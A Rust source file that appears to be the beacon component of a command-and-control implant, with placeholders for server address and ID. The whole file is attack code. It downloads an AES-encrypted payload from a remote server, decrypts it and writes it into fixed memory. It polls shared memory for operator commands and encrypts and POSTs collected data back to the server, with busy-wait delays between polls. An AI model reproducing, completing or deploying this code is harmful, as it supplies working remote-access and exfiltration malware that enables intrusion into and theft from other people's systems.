#![no_main]
#[warn(unused_mut)]
#[warn(unused_variables)]
use minreq;
// 192.168.15.4:8085
static UNIQUE_ID: &str = "{!unique_id}";
static SERVER_ADDRESS: &str = "{!server_address}";

extern crate libc;
use lazy_static::lazy_static;

use std::ffi::CString;
use winapi::shared::minwindef::LPVOID;
use std::arch::global_asm;
use std::ptr;
use std::slice;
use std::time::Instant;
use std::arch::asm;
use core::ffi::c_void;
use std::mem;
use std::ffi::CStr;
use std::hint;
use std::ffi::c_char;
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use aes::Aes256;
use rand::Rng;
type Aes256CbCDec = cbc::Decryptor<Aes256>;
type Aes256CbcEnc = cbc::Encryptor<Aes256>;

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut};
use aes::cipher::KeyIvInit;

lazy_static! {
    static ref FORMATTED_URL: String = {
        format!("{}/{}", SERVER_ADDRESS, UNIQUE_ID)
    };
}

fn sleep_func(){
    unsafe {
        let mut hit = false;
        let mut time_in_future = 0;

        while true{

            std::hint::spin_loop();
            let instant2 = Instant::now(); // get RDTSC (loop)
            

            let instant_bytes: [u8; mem::size_of::<Instant>()] = mem::transmute(instant2);
            let ptr = instant_bytes.as_ptr();
            let tv_sec_ptr = ptr as *const u64; // extracting tv_sec from RDTSC return 

            if hit == false{
                hit = true;
                time_in_future = *tv_sec_ptr + 3; // previous captured RDTSC (tv_sec) + 20 (seconds)
            }

            std::hint::spin_loop();
            if (*tv_sec_ptr) > time_in_future{
                break
            }
        }

    }
}

fn download_code() -> Result<(), minreq::Error>{
    unsafe{
        // println!("connecting to: {:?}", FORMATTED_URL.clone());
        let sc = minreq::get(FORMATTED_URL.clone()).send()?;
        let resp = sc.as_bytes();
        let statusc = sc.status_code;

        if statusc == 200 {

            let mut vec: Vec<u8> = Vec::new();
            for i in resp.iter() {
                vec.push(*i);
            }
            let iv = &vec[..16];
        
            let mut data = &mut vec[16..].to_vec();
            let mut buf = [0u8; 131072];
            let dec_pass = &UNIQUE_ID.as_bytes()[..32];
        
            let cipher = Aes256CbCDec::new_from_slices(&dec_pass, &iv).unwrap();
            cipher.decrypt_padded_mut::<Pkcs7>(&mut data).unwrap();


            let address = 0xB16B00B0 as *mut u8;
            unsafe {
                for (i, &byte) in data.iter().enumerate() {
                    core::ptr::write_volatile(address.add(i), byte);
                }
            }

        }
    }
    Ok(())
}
fn upload_data(body: Vec<u8>, unique_id: String) -> Result<(), minreq::Error>{
    unsafe{

        let vec: Vec<u8> = vec![0; 20480];
        let address = 0xBAADF000 as *mut u8;
        unsafe {
            for (i, &byte) in vec.iter().enumerate() {
                let addr = address.wrapping_add(i);
                core::ptr::write_volatile(addr, 0);
            }
        }

        let url = format!("{}/{}", FORMATTED_URL.clone(), unique_id);
        // println!("UNIQUE_ID: {:?}", UNIQUE_ID);
    
        let dec_pass = &UNIQUE_ID.as_bytes()[..32];

        // println!("dec_pass:");
        for &byte in dec_pass {
            print!("{:02x} ", byte);
        }

        let iv_size = 16;
        let mut iv = vec![0u8; iv_size];
        rand::thread_rng().fill(&mut iv[..]);


        // println!("iv:");
        for &byte in &iv {
            print!("{:02x} ", byte);
        }


        let mut body_slice: &[u8] = &body;
        let cipher = Aes256CbcEnc::new_from_slices(&dec_pass, &iv).unwrap();
        let mut data = cipher.encrypt_padded_vec_mut::<Pkcs7>(&mut body_slice);

        // println!("data:");
        for &byte in &data {
            print!("{:02x} ", byte);
        }
        
        let encodedData = base64::encode(&data);
        let bytes_vec: Vec<u8> = encodedData.into_bytes();

        // println!("{:?}", data);
        let sc = minreq::post(url).with_body(bytes_vec).send()?;
        // println!("{:?}", sc);
        // println!("data sent...");
    }
    Ok(())
}
#[no_mangle]
pub extern "C" fn main(param: LPVOID){
    // println!("hellcome");
    let _ = download_code();
    unsafe {
            let mut hit = false;
            let mut time_in_future = 0;
            loop{
                std::hint::spin_loop();
                let mut result1: u64 = 0;
                let address: *const u8 = 0xBAADF000 as *const u8;
                let first_byte: u8 = ptr::read_volatile(address);

                if first_byte != 1{
                    std::hint::spin_loop();
                    sleep_func();
                    let _ = download_code();
                }
                if first_byte == 6{
                    let address: *const u8 = 0xBAADF000 as *const u8;
                    let read_control_byte: u8 = ptr::read_volatile(address.wrapping_add(1));

                    // println!("Read control byte: {:?}", read_control_byte);
                    if read_control_byte == 1{
                        let address: *mut u64 = 0xBAADF002 as *mut u64; // skip first byte (header -> 6) and get memory address of string reference 
                        let ptr_str: *const c_char = ptr::read_volatile(address as *const *const c_char);
                        let c_str = unsafe{ CString::from_raw(ptr_str as *mut i8) };

                        let unique_id_address: *mut u64 = 0xCAFE000A as *mut u64; // skip first address (size of u64) and get unique identifier for command
                        let ptr_str_id: *const c_char = ptr::read_volatile(unique_id_address as *const *const c_char);
    
                        let c_str_2 = unsafe { CString::from_raw(ptr_str_id as *mut i8) };

                        let cloned_c_str = c_str_2.clone();
                        let cloned_c_str_2 = c_str.clone();
    
                        // println!("[initial_beacon] unique_id: {:?}", cloned_c_str.to_str().unwrap());
                        // println!("[initial_beacon] data: {:?}", cloned_c_str_2.to_str().unwrap());

                        upload_data(c_str.to_bytes().to_vec().into(), cloned_c_str.to_string_lossy().into_owned());
    
                        let address = 0xBAADF000 as *mut u8;
                        unsafe {
                            for i in 0..20480 {
                                core::ptr::write_volatile(address.wrapping_add(i), 0);
                            }
                        }
                    }

                }
                else{
                    continue
                }

            }
            // println!("End of execution...");

    }
}
